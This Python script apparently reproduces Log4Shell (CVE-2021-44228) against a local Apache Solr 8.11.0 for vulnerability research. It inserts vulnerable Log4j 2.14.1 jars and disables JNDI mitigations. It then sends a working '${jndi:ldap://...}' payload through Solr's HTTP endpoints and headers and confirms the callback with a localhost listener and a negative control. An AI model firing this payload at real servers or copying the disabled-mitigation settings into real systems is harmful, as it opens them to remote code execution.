#!/usr/bin/env python3
import argparse
import hashlib
import json
import shutil
import socket
import subprocess
import tarfile
import threading
import time
import urllib.request
from pathlib import Path


SOLR_URL = "https://archive.apache.org/dist/lucene/solr/8.11.0/solr-8.11.0.tgz"
ROOT = Path("/data/lhq/workspace")
OUT_ROOT = ROOT / "ljl-v1-downstream-insertions"
SAMPLE_ID = "CVE-2021-44228__apache_solr_8_11_0_v1_log4j_real_entrypoint"
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = ROOT / "ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1"
LEGACY_SOLR_SAMPLE = ROOT / "ljl-strict-redo/samples/CVE-2021-44228__apache_solr_8_11_0"
M2 = ROOT / "ljl-patch-java30-projects/.m2-poc"
V1_LOG4J_JARS = {
    "log4j-api-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
}


def run(cmd, cwd, log_path, check=False):
    with log_path.open("a", encoding="utf-8") as log:
        log.write("$ " + " ".join(cmd) + "\n")
        proc = subprocess.run(cmd, cwd=str(cwd), stdout=log, stderr=subprocess.STDOUT, text=True)
        log.write(f"[exit] {proc.returncode}\n")
    if check and proc.returncode != 0:
        raise RuntimeError(f"command failed: {' '.join(cmd)}")
    return proc.returncode


def ensure_solr(workdir, log_path):
    tgz = workdir / "solr-8.11.0.tgz"
    solr_dir = workdir / "solr-8.11.0"
    legacy_tgz = LEGACY_SOLR_SAMPLE / "solr-8.11.0.tgz"
    legacy_dir = LEGACY_SOLR_SAMPLE / "solr-8.11.0"
    if not tgz.exists() and legacy_tgz.exists():
        shutil.copy2(legacy_tgz, tgz)
    if not solr_dir.exists() and legacy_dir.exists():
        shutil.copytree(legacy_dir, solr_dir)
    if not tgz.exists():
        with log_path.open("a", encoding="utf-8") as log:
            log.write(f"Downloading {SOLR_URL}\n")
        urllib.request.urlretrieve(SOLR_URL, tgz)
    if not solr_dir.exists():
        with tarfile.open(tgz, "r:gz") as tar:
            tar.extractall(workdir)
    return solr_dir


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def jar_version(jar_path, group_prefix):
    proc = subprocess.run(
        ["jar", "tf", str(jar_path)],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        check=True,
    )
    props = [
        line
        for line in proc.stdout.splitlines()
        if line.startswith(group_prefix) and line.endswith("/pom.properties")
    ]
    if not props:
        return None
    proc = subprocess.run(
        ["unzip", "-p", str(jar_path), props[0]],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        check=True,
    )
    for line in proc.stdout.splitlines():
        if line.startswith("version="):
            return line.split("=", 1)[1]
    return None


def insert_v1_log4j(solr_dir, evidence_dir):
    ext = solr_dir / "server/lib/ext"
    before = {}
    inserted = {}
    for name, source in V1_LOG4J_JARS.items():
        if not source.exists():
            raise RuntimeError(f"missing v1 jar: {source}")
        target = ext / name
        before[name] = {
            "target_path": str(target),
            "existed_before_insertion": target.exists(),
            "sha256_before": sha256(target) if target.exists() else None,
        }
        if target.exists():
            target.unlink()
        shutil.copy2(source, target)
        inserted[name] = {
            "source_v1_runtime_jar": str(source),
            "target_path": str(target),
            "sha256_source": sha256(source),
            "sha256_target_after": sha256(target),
            "version_after": jar_version(target, "META-INF/maven/org.apache.logging.log4j/"),
        }
    all_log4j = sorted(str(p.relative_to(solr_dir)) for p in ext.glob("log4j-*.jar"))
    evidence = {
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_method": "delete Solr runtime log4j-api/core jars, then copy the generated v1 runtime Log4j 2.14.1 jars from .m2-poc into Solr server/lib/ext before starting the real solr entrypoint",
        "runtime_log4j_jars_after_insertion": all_log4j,
        "before_insertion": before,
        "inserted_v1_jars": inserted,
    }
    (evidence_dir / "dependency-evidence.json").write_text(
        json.dumps(evidence, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (evidence_dir / "dependency-evidence.txt").write_text("\n".join(all_log4j) + "\n", encoding="utf-8")
    return evidence


def start_listener(evidence_dir, case_name, marker_path, timeout=8):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-listener-port.txt").write_text(
                str(port_box["port"]), encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})
                marker_path.write_text("1", encoding="utf-8")
                try:
                    conn.sendall(bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0]))
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError("listener did not start")
    return port_box["port"], received, thread


def http_get(path, headers):
    req = urllib.request.Request("http://127.0.0.1:18983" + path, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=3) as resp:
            return {"path": path, "status": resp.status, "body_prefix": resp.read(160).decode("utf-8", "replace")}
    except Exception as exc:
        return {"path": path, "exception": repr(exc)}


def exercise_solr(evidence_dir, case_name, token, timeout=8):
    marker_path = Path(f"/tmp/TRIGGER_CVE-2021-44228_SOLR_V1_INSERTED_{case_name}")
    marker_path.write_text("0", encoding="utf-8")
    port, received, thread = start_listener(evidence_dir, case_name, marker_path, timeout=timeout)
    payload = token(port) if callable(token) else token
    responses = [
        http_get(
            "/solr/admin/info/system?wt=json&probe=" + payload,
            {"User-Agent": payload, "X-Forwarded-For": payload},
        ),
        http_get(
            "/solr/admin/cores?action=STATUS&wt=json&probe=" + payload,
            {"User-Agent": payload},
        ),
        http_get(
            "/solr/does-not-exist/" + payload + "?wt=json",
            {"User-Agent": payload},
        ),
    ]
    thread.join(timeout)
    marker = marker_path.read_text(encoding="utf-8").strip()
    return {
        "case": case_name,
        "payload": payload,
        "listener_port": port,
        "listener_received_count": len(received),
        "listener_received": received,
        "marker_path": str(marker_path),
        "marker": marker,
        "responses": responses,
    }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(OUT_ROOT))
    args = parser.parse_args()

    workdir = Path(args.workdir)
    sample_dir = workdir / "samples" / SAMPLE_ID
    evidence_dir = sample_dir / "evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_log = evidence_dir / "run.log"
    run_log.write_text("", encoding="utf-8")
    solr_dir = ensure_solr(sample_dir, run_log)
    dependency_evidence = insert_v1_log4j(solr_dir, evidence_dir)

    solr_home = sample_dir / "solr-home"
    if solr_home.exists():
        shutil.rmtree(solr_home)
    shutil.copytree(solr_dir / "server" / "solr", solr_home)

    run([str(solr_dir / "bin" / "solr"), "stop", "-p", "18983", "-force"], solr_dir, run_log)
    rc = run([
        str(solr_dir / "bin" / "solr"),
        "start",
        "-p",
        "18983",
        "-s",
        str(solr_home),
        "-force",
        "-a",
        "-Dlog4j2.formatMsgNoLookups=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=true",
    ], solr_dir, run_log)
    if rc != 0:
        raise RuntimeError("Solr failed to start")
    time.sleep(1)

    positive = exercise_solr(
        evidence_dir,
        "positive",
        lambda port: "${jndi:ldap://127.0.0.1:%d/a}" % port,
    )
    negative = exercise_solr(evidence_dir, "negative", "strict-negative-control")

    run([str(solr_dir / "bin" / "solr"), "stop", "-p", "18983", "-force"], solr_dir, run_log)
    status_after = subprocess.run([str(solr_dir / "bin" / "solr"), "status"], cwd=str(solr_dir), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    (evidence_dir / "status-after-stop.txt").write_text(status_after.stdout, encoding="utf-8")

    confirmed = positive["listener_received_count"] > 0 and negative["listener_received_count"] == 0
    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "downstream_repo": "apache/solr",
        "downstream_application": "Apache Solr 8.11.0",
        "downstream_entrypoint": "bin/solr real HTTP admin endpoints",
        "cve": "CVE-2021-44228",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "dependency_evidence": dependency_evidence,
        "attack_surface": "HTTP request to Solr admin endpoint",
        "payload": positive["payload"],
        "positive": positive,
        "negative": negative,
        "dynamic_signal": {
            "positive_listener_received_count": positive["listener_received_count"],
            "positive_listener_received": positive["listener_received"],
            "positive_marker": positive["marker"],
            "negative_listener_received_count": negative["listener_received_count"],
            "negative_listener_received": negative["listener_received"],
            "negative_marker": negative["marker"],
        },
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": "The verifier does not execute .cve_poc_local. It inserts the generated v1 Log4j 2.14.1 runtime jars into an isolated Solr distribution and triggers Log4Shell through Solr's real HTTP admin endpoints.",
    }
    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "Run `python3 scripts/verify_solr_log4j_v1_inserted.py` from `/data/lhq/workspace/ljl-v1-downstream-insertions`.\n"
        "The verifier inserts the generated v1 Log4j 2.14.1 runtime jars into Apache Solr 8.11.0, "
        "starts Solr through its real entrypoint, sends HTTP requests containing a JNDI payload, "
        "and confirms a local listener receives the Log4j LDAP lookup while the negative control does not.\n",
        encoding="utf-8",
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
